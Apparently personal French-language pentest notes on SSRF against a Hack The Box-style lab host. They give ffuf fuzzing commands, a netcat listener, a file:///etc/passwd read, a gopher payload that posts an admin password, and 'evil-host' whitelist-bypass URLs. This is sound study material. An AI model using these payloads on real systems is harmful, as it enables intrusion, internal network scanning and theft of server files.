

- **http:// et https://** : Ces schémas d'URL permettent de récupérer du contenu via des requêtes HTTP/S. Un attaquant pourrait l'utiliser dans l'exploitation des vulnérabilités SSRF pour contourner les WAFs, accéder à des points d'extrémité restreints, ou accéder à des points d'extrémité dans le réseau interne

- **file://** : Ce schéma d'URL permet de lire un fichier à partir du système de fichiers local. Un attaquant pourrait l'utiliser dans l'exploitation de vulnérabilités SSRF pour lire des fichiers locaux sur le serveur web (LFI)

-  **gopher://** : Ce protocole peut envoyer des octets arbitraires à l'adresse spécifiée. Un attaquant pourrait l'utiliser dans l'exploitation de vulnérabilités SSRF pour envoyer des requêtes HTTP POST avec des charges utiles arbitraires ou communiquer avec d'autres services tels que des serveurs SMTP ou des bases de données.


# Identifier une SSRF

> [!TIP]
> Identifier une requête POST qui pointe vers une URL 


## Confirmer la SSRF

Lancer listener

```bash
nc -lnvp 8000
```

changer l'URL en mettant l'adresse de mon server /ssrf

Vérifier si le listener reçoit une requête

### Déterminer si la réponse nous reflète la SSRF en spécifiant une ressource existante sur le serveur en question

http://127.0.0.1/index.php


## Enumérer le système

### Scanner les ports ouverts sur le serveur

Créer une wordlist pour les ports 1 à 65535

```bash
seq 1 65535 > ports.txt
```

Fuzzing des ports avec ffuf

```bash
ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```


# Exploiter la SSRF

### Trouver des endpoint supplémentaires

Fuzzing des repertoires avec ffuf

```shell
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```

### LFI

```bash
file:///etc/passwd
```

### Gopher

```bash
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

Utiliser Gopherus pour générer des payloads gopher

# BLIND SSRF

> [!TIP]
> Si le listener reçoit bien une requête mais que la réponse du server web ne retourne pas la réponse attendue alors il s'agit d'une blind SSRF

Dans ce cas il est possible d'identifier si la ressource requêtée existe bien ou non en fonction de la réponse obtenue


# BYPASS de whitelist

- `https://expected-host:fakepassword@evil-host`
- `https://evil-host#expected-host`
- `https://expected-host.evil-host`

[[OPEN REDIRECT]]